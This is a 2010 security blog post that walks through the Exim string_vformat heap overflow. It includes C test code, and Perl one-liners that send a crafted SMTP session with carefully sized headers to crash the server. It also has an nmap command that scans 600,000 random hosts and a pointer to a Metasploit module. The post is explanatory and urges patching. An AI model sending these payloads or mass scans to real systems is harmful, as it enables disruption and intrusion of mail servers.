---
id: 995
title: 'Watch out for exim!'
date: '2010-12-15T09:24:49-05:00'
author: ron
layout: post
guid: 'http://www.skullsecurity.org/blog/?p=995'
permalink: /2010/watch-out-for-exim
categories:
    - hacking
    - re
    - tools
---

Hey everybody,

Most of you have probably heard of the <a href='http://www.exim.org/lurker/message/20101207.215955.bb32d4f2.en.html'>exim vulnerability</a> this week. It has potential to be a nasty one, and my brain is stuffed with its inner workings right now so I want to post before I explode! 

First off, if you're concerned that you might have vulnerable hosts, I wrote a plugin for <a href='http://nessus.org'>Nessus</a> to help you find them (I'm not sure if it's in the ProfessionalFeed yet - if it isn't, it will be soon). There's no Nmap script yet, but my sources tell me that it's in progress (keep an eye on <a href='https://twitter.com/iagox86'>my Twitter account</a> for updates on that). 
<!--more-->
<h2>The vulnerability</h2>
The vulnerability is actually a pretty old one. It was <a href='http://bugs.exim.org/show_bug.cgi?id=787'>fixed two years ago</a> (December of 2008). If you look at <a href='http://git.exim.org/exim.git/commitdiff/24c929a2'>the patch</a>, it doesn't tell you much. The obvious thing to do, then, is to <a href='http://exim.mirror.iphh.net/ftp/exim/exim4/exim-4.69.tar.bz2'>download the code</a> and try to break it! So let's do that... 

The first step is to extract the source and compile it. My strategy was to keep running 'make' and fixing what it complained about until it shut up and compiled. Exim's compilation is annoying like that. You may have more luck reading the manual -- both good! 

Once it's built, I decided to take a look at the patched function. It's called string_vformat() in src/string.c. It's very long, but here's the prototype:
<pre>BOOL string_vformat(uschar *buffer, int buflen, char *format, va_list ap);</pre>

Aha! buffer, buflen, format, and a va_list - it looks like sprintf() to me! Looking one function up, where it's called from, we find string_format(), which is basically a wrapper around string_vformat():
<pre>BOOL string_format(uschar *buffer, int buflen, char *format, ...)</pre>

Based on the patch and the nature of the function, it was obviously the %s format specifier that was being changed, and it seemed to have something to do with the bounds checking. Rather than reading/understanding all that complicated code, I decided to send stuff into that function and see if I could get it to write off its own buffer. Simple, eh?

So here's the first test I wrote (I took the lazy approach and replaced the real main() function in exim.c with this) (I swear this is the first thing I tried.. I must be lucky or something!):
<pre>int main(int argc, char *argv[])
{   
    char buffer[16];
    int i, j;

    for(i = 1; i < 8; i++)
    {   
        memset(buffer, 0, 16);
        string_format(buffer, i, "TEST%s", 
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        for(j = 0; j < 16; j++)
            printf("%02x ", buffer[j]);
        printf("\n");
    }
    return 0;
}</pre>

Simple enough! We start by setting the buffer length to 1, which should produce an empty string (since the string is terminated with a NULL byte '\x00'). Then we should see 'T', then 'TE', 'TES', etc. Here's what the result is:
<pre>$ make
[...]
$ build-Linux-x86_64/exim
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
54 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
54 45 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
54 45 53 00 00 00 00 00 00 00 00 00 00 00 00 00 
54 45 53 54 41 41 41 41 41 41 41 41 41 41 41 41 
54 45 53 54 00 00 00 00 00 00 00 00 00 00 00 00 
54 45 53 54 41 00 00 00 00 00 00 00 00 00 00 00
Segmentation fault
</pre>

Woah, what have we here? When the max length is set to 5, all hell breaks loose! It even manages to segfault my test program (thanks, obviously, to a stack overflow). A quick check shows us that the '%s' is exactly 5 characters into the string, which just happens to be 'buflen'. Testing with other strings will prove that if '%s' is at the index of 'buflen', 'buflen' is ignored and the string will be written right off the end of the buffer into whatever happens to be next. 

Now, that leads to the obvious question: where can we find a case where we can control 'buflen' to ensure that '%s' ends up in exactly the right place? That's a rare condition indeed! And this is where I got a little stuck. To help track it down, I added some output to string_vformat() that displays the format string, buflen, and the output every time it runs. Then I did some normal transactions and looked at the output. Here's how (remove the newlines to test this yourself.. I only have so much horizontal room to work with):

<pre>echo -ne 'EHLO domain\r\nMAIL FROM: test@test.com\r\n
    RCPT TO: test@localhost\r\nDATA\r\n
    This is some data!\r\n.\r\n' | sudo ./exim -bs</pre>

This builds an SMTP request with echo and sends it to the exim binary. 'exim -bs' is how exim is run when it's used as inetd, which means it's expecting network traffic to come in stdin. Here are the strings that came into string_vformat():
<pre>string_vformat: [250] 'initializing' => initializing
string_vformat: [48] '%s' => root
string_vformat: [128] '%s' => /root
string_vformat: [128] '%s' =>
string_vformat: [128] '%s' => /bin/bash
string_vformat: [250] 'accepting a local %sSMTP message from <%s>' => 
accepting a local SMTP message from <root>
string_vformat: [32768] 'SMTP connection from %s' => SMTP connection from root
string_vformat: [32768] '%s/log/%%slog' => /var/spool/exim/log/%slog
string_vformat: [8171] '%s' => SMTP connection from root
string_vformat: [16384] '%s' => 220 ankh ESMTP Exim 4.69 
Tue, 14 Dec 2010 20:01:28 -0600

string_vformat: [32768] '%.3s %s Hello %s%s%s' => 250 ankh Hello root at domain
string_vformat: [16384] '250 OK
' => 250 OK

string_vformat: [32768] 'ACL "%s"' => ACL "acl_check_rcpt"
string_vformat: [16384] '250 Accepted
' => 250 Accepted

string_vformat: [16384] '354 Enter message, ending with "." on a line by itself
' => 354 Enter message, ending with "." on a line by itself

string_vformat: [208] ' id=%s' =>  id=1PSggK-0002bd-0P
string_vformat: [32768] '%sMessage-Id: <%s%s%s@%s>
' => Message-Id: <E1PSggK-0002bd-0P@ankh>

string_vformat: [32768] '%sFrom: %s%s%s%s
' => From: test@test.com

string_vformat: [32768] '%sDate: %s
' => Date: Tue, 14 Dec 2010 20:01:28 -0600

string_vformat: [32768] '%s; %s
' => Received: from root (helo=domain)
        by ankh with local-esmtp (Exim 4.69)
        (envelope-from <test@test.com>)
        id 1PSggK-0002bd-0P
        for test@localhost; Tue, 14 Dec 2010 20:01:28 -0600

string_vformat: [32768] 'ACL "%s"' => ACL "acl_check_data"
string_vformat: [8154] '%s' => <= test@test.com U=root P=local-esmtp S=294
string_vformat: [256] '/var/spool/exim/log/%slog' => /var/spool/exim/log/mainlog
string_vformat: [16384] '250 OK id=%s
' => 250 OK id=1PSggK-0002bd-0P

string_vformat: [128] '%s lost input connection' => ankh lost input connection
string_vformat: [16384] '%s %s
' => 421 ankh lost input connection

string_vformat: [32768] 'SMTP connection from %s' => SMTP connection from root
string_vformat: [8171] '%s lost%s' => SMTP connection from root lost
</pre>

Looking down that list, none of those are obvious places where we can control the length of the format string. Damn! I tried a bunch of other variations without any luck. Things weren't looking good.. I was stuck! 

Fortunately, <a href='http://www.exim.org/lurker/message/20101207.215955.bb32d4f2.en.html'>the original post</a> had a mostly complete packet dump. After playing for awhile, I finally figured out that sending a bunch of DATA headers, plus the 50mb of garbage, did something interesting! Here's the command I used (again, remove the linebreaks to try this):
<pre>$ perl -e 'print "EHLO domain\r\nMAIL FROM: test@test.com\r\n
    RCPT TO: test@localhost\r\nDATA\r\n" . "This: is some data\r\n"x100 . 
    "This is more data!\r\n"x5000000 . "\r\n.\r\n"' | ./exim -bs</pre>

And here's how the log looked:
<pre>string_vformat: [8018] '%c %s' =>   This: is some data
string_vformat: [7997] '%c %s' =>   This: is some data
string_vformat: [7976] '%c %s' =>   This: is some data
string_vformat: [7955] '%c %s' =>   This: is some data
string_vformat: [7934] '%c %s' =>   This: is some data
string_vformat: [7913] '%c %s' =>   This: is some data
string_vformat: [7892] '%c %s' =>   This: is some data
.....down to 0</pre>

Great, this looks good! ... but why does it work?

Well, it turns out that if a message is rejected (because, for example, it's too large), the headers for the message are logged in a buffer, one at a time. When each one is logged, the buffer is shortened, which means by tweaking the length of the headers we can control the 'buflen' field. Since the format specifier '%s' is at the third character in the string, we want to end up with three bytes left then add a huge string to the buffer that overwrites the heap. 

So now, we do a whole lot of complicated math and a ton of patience, we whittle the buffer to three bytes, then overflow the crap out of it:
<pre>$ perl -e 'print "EHLO domain\r\nMAIL FROM: test@test.com\r\n
    RCPT TO: test@localhost\r\nDATA\r\n" . "This: is some data\r\n"x381 . 
    "Final: AAAA\r\nBoom: " . "A"x50000 . "This is more data!\r\n"x5000000 . 
    "\r\n.\r\n"' | ./exim -bs
220 ankh ESMTP Exim 4.69 Tue, 14 Dec 2010 20:19:10 -0600
250-ankh Hello ron at domain
250-SIZE 52428800
250-PIPELINING
250 HELP
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
Segmentation fault
</pre>

Bodabing! Overflow successful. 

The hard part is getting all the sizes, headers, etc just right. The easy part is turning this into code execution -- take a look at <a href='http://www.metasploit.com/modules/exploit/unix/smtp/exim4_string_format'>Metasploit</a> to find out that part. 

<h2>Who's vulnerable?</h2>
Any 4.6x version of Exim is potentially vulnerable, and possibly earlier versions too. The problem is, different versions may have different logging formats, which means the carefully selected count we did to overflow the buffer isn't going to cut it. So in reality, 4.69-debian is highly vulnerable, because that's what Metasploit and Nessus target; other versions may be as well. 

So that naturally leads to the question - how many people are running Exim 4.69? Well, my friend bob, always the troublemaker, decided to scan 600,000 hosts on port 25 to see what's running. I don't recommend following in his footsteps, but this is the command he used:
<pre>$ sudo ./nmap -n -d --log-errors -PS25 -p25 --open -sV -T5 -iR 600000 
    -oA output/smtp-versions</pre>

Here are the top 10 versions returned (I removed the versions that Nmap didn't recognize), along with their associated counts:
<pre>    240 25/tcp open  smtp    syn-ack Postfix smtpd
    206 25/tcp open  smtp    syn-ack Exim smtpd 4.69
     96 25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.4675
     78 25/tcp open  smtp    syn-ack qmail smtpd
     77 25/tcp open  smtp    syn-ack netqmail smtpd 1.04
     40 25/tcp open  smtp    syn-ack BorderWare firewall smtpd
     22 25/tcp open  smtp    syn-ack Microsoft ESMTP
     21 25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
     19 25/tcp open  smtp    syn-ack Cisco PIX sanitized smtpd
     18 25/tcp open  smtp    syn-ack Sendmail 8.13.8/8.13.8
</pre>
Based on those numbers, I think it's safe to say that Exim smtpd 4.69 is the second most popular SMTP server in the universe. <a href='/blogdata/smtp-versions-count.txt'>Here's a complete listing</a>. I considered posting the full Nmap log, but I was worried that one of the servers' owners might notice and be upset at Bob. And I don't want to make any extra trouble for him! 

<h2>Conclusion</h2>
The conclusion to this is simple: To all those people running vulnerable (or potentially vulnerable) versions of exim: patch! Patch now! This is an incredibly easy exploit to pull off, and there are public versions everywhere. Protect yourself! 

And if you don't have a Nessus ProfessionalFeed, get one and you can test your network right now! 
